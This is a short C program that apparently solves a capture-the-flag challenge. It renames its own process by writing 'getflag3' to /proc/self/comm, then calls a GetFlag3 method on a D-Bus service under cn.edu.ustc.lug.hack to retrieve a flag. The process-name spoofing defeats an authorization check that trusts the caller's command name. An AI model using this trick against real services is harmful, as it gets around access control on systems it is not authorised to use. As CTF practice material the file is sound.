#include <gio/gio.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>

int main(void) {
    GError *error = NULL;
    GDBusConnection *connection;
    GVariant *result;
    
    const char *new_comm = "getflag3";

    // Open /proc/self/comm for writing
    int fd = open("/proc/self/comm", O_WRONLY);
    if (fd == -1) {
        perror("Failed to open /proc/self/comm");
        return 1;
    }

    // Write the new command name to /proc/self/comm
    ssize_t bytes_written = write(fd, new_comm, strlen(new_comm));
    if (bytes_written == -1) {
        perror("Failed to write to /proc/self/comm");
        close(fd);
        return 1;
    }

    // Close the file descriptor
    close(fd);

    // Connect to system bus
    connection = g_bus_get_sync(G_BUS_TYPE_SYSTEM, NULL, &error);
    if (error != NULL) {
        g_printerr("Failed to connect to system bus: %s\n", error->message);
        g_error_free(error);
        return 1;
    }

    // Call GetFlag3 method
    result = g_dbus_connection_call_sync(
        connection,
        "cn.edu.ustc.lug.hack.FlagService",        // bus name
        "/cn/edu/ustc/lug/hack/FlagService",       // object path
        "cn.edu.ustc.lug.hack.FlagService",        // interface name
        "GetFlag3",                                // method name
        NULL,                                      // no parameters needed
        G_VARIANT_TYPE("(s)"),                     // reply type
        G_DBUS_CALL_FLAGS_NONE,
        -1,
        NULL,
        &error);

    if (error != NULL) {
        g_printerr("Failed to call GetFlag3: %s\n", error->message);
        g_error_free(error);
        g_object_unref(connection);
        return 1;
    }

    // Extract and print the flag
    const gchar *flag;
    g_variant_get(result, "(&s)", &flag);
    printf("Flag3: %s\n", flag);

    // Cleanup
    g_variant_unref(result);
    g_object_unref(connection);
    
    return 0;
}
